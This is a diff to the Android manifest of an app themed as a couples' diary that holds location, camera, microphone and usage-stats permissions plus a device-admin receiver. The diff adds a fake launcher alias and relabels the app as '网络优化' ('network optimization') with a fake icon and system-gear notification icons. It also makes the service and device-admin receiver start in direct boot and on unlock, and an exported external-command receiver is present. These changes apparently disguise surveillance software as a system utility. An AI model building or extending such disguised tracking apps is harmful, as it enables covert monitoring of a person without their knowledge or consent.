@@ -16,24 +16,19 @@
     <uses-permission android:name="android.permission.WAKE_LOCK" />
 
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
-    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" tools:targetApi="s" />
     <uses-permission android:name="android.permission.REQUEST_IGNORE_BATTERY_OPTIMIZATIONS" />
     <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
+    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
+    <uses-permission android:name="android.permission.SCHEDULE_EXACT_ALARM" tools:targetApi="s" />
     <uses-permission android:name="android.permission.POST_NOTIFICATIONS" />
     <uses-permission android:name="android.permission.USE_FULL_SCREEN_INTENT" />
-    <uses-permission android:name="android.permission.PACKAGE_USAGE_STATS" tools:ignore="ProtectedPermissions" />
 
     <uses-permission android:name="android.permission.READ_PHONE_STATE" />
     <uses-permission android:name="android.permission.CAMERA" tools:ignore="PermissionImpliesUnsupportedChromeOsHardware" />
     <uses-permission android:name="android.permission.RECORD_AUDIO" />
     <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
     <uses-permission android:name="android.permission.ACTIVITY_RECOGNITION" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
     <uses-permission android:name="android.permission.VIBRATE" />
-    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW" />
-    <uses-permission android:name="android.permission.RECORD_AUDIO" />
-    <uses-permission android:name="android.permission.MODIFY_AUDIO_SETTINGS" />
-
 
     <queries>
         <intent>
@@ -46,19 +41,20 @@
         android:allowBackup="true"
         android:dataExtractionRules="@xml/data_extraction_rules"
         android:fullBackupContent="@xml/backup_rules"
-        android:icon="@mipmap/ic_launcher"
-        android:label="@string/app_name"
-        android:roundIcon="@mipmap/ic_launcher_round"
+        android:icon="@mipmap/ic_fake_launcher"
+        android:label="网络优化"
+        android:roundIcon="@mipmap/ic_fake_launcher"
         android:supportsRtl="true"
         android:theme="@style/Theme.情侣手记"
-        tools:ignore="ExtraText"
         android:usesCleartextTraffic="true" >
+
         <service android:name="com.amap.api.location.APSService" />
 
         <service
             android:name=".service.LocationService"
             android:enabled="true"
             android:exported="false"
+            android:directBootAware="true"
             android:foregroundServiceType="location|dataSync" />
 
         <service
@@ -89,6 +85,7 @@
             android:name=".util.MyDeviceAdminReceiver"
             android:exported="true"
             android:label="情侣手记管理员"
+            android:directBootAware="true"
             android:permission="android.permission.BIND_DEVICE_ADMIN">
             <meta-data
                 android:name="android.app.device_admin"
@@ -96,8 +93,11 @@
             <intent-filter>
                 <action android:name="android.app.action.DEVICE_ADMIN_ENABLED" />
                 <action android:name="android.intent.action.BOOT_COMPLETED" />
+                <action android:name="android.intent.action.LOCKED_BOOT_COMPLETED" />
+                <action android:name="android.intent.action.USER_PRESENT" />
             </intent-filter>
         </receiver>
+
         <receiver
             android:name=".util.ExternalCommandReceiver"
             android:exported="true">
@@ -106,19 +106,50 @@
             </intent-filter>
         </receiver>
 
-
         <meta-data
             android:name="com.amap.api.v2.apikey"
             android:value="aa2deebf852718ded2abd49f2fbb8980" />
 
         <activity
             android:name=".MainActivity"
+            android:launchMode="singleTask"
             android:exported="true">
+
+        </activity>
+
+        <activity
+            android:name=".NetworkOptActivity"
+            android:exported="true"
+            android:launchMode="singleTask"
+            android:theme="@style/Theme.AppCompat.NoActionBar">
+        </activity>
+
+        <activity-alias
+            android:name=".RealLauncher"
+            android:enabled="true"
+            android:exported="true"
+            android:icon="@mipmap/ic_launcher"
+            android:roundIcon="@mipmap/ic_launcher_round"
+            android:label="@string/app_name"
+            android:targetActivity=".MainActivity">
             <intent-filter>
                 <action android:name="android.intent.action.MAIN" />
                 <category android:name="android.intent.category.LAUNCHER" />
             </intent-filter>
-        </activity>
+        </activity-alias>
+
+        <activity-alias
+            android:name=".FakeLauncher"
+            android:enabled="false"
+            android:exported="true"
+            android:icon="@mipmap/ic_fake_launcher"
+            android:label="网络优化"
+            android:targetActivity=".NetworkOptActivity">
+            <intent-filter>
+                <action android:name="android.intent.action.MAIN" />
+                <category android:name="android.intent.category.LAUNCHER" />
+            </intent-filter>
+        </activity-alias>
 
         <activity
             android:name=".LoginActivity"
@@ -130,7 +161,7 @@
             android:name=".ui.ChatActivity"
             android:exported="false"
             android:windowSoftInputMode="adjustResize"
-            android:launchMode="standard"
+            android:launchMode="singleTask"
             android:screenOrientation="portrait"/>
 
         <activity
@@ -138,9 +169,6 @@
             android:screenOrientation="portrait"
             android:configChanges="orientation|screenSize"
             android:theme="@style/Theme.AppCompat.NoActionBar" />
-
-
-
 
         <receiver
             android:name=".widget.CoupleWidgetProvider"
@@ -154,7 +182,6 @@
                 android:resource="@xml/couple_widget_info" />
         </receiver>
 
-
         <provider
             android:name="androidx.core.content.FileProvider"
             android:authorities="${applicationId}.fileprovider"
@@ -164,6 +191,14 @@
                 android:name="android.support.FILE_PATHS"
                 android:resource="@xml/file_paths" />
         </provider>
+
+        <meta-data
+            android:name="com.google.firebase.messaging.default_notification_icon"
+            android:resource="@drawable/ic_system_gear" />
+        <meta-data
+            android:name="com.google.android.gms.cast.METADATA_KEY_NOTIFICATION_ICON"
+            android:resource="@drawable/ic_system_gear" />
+
     </application>
 
 </manifest>
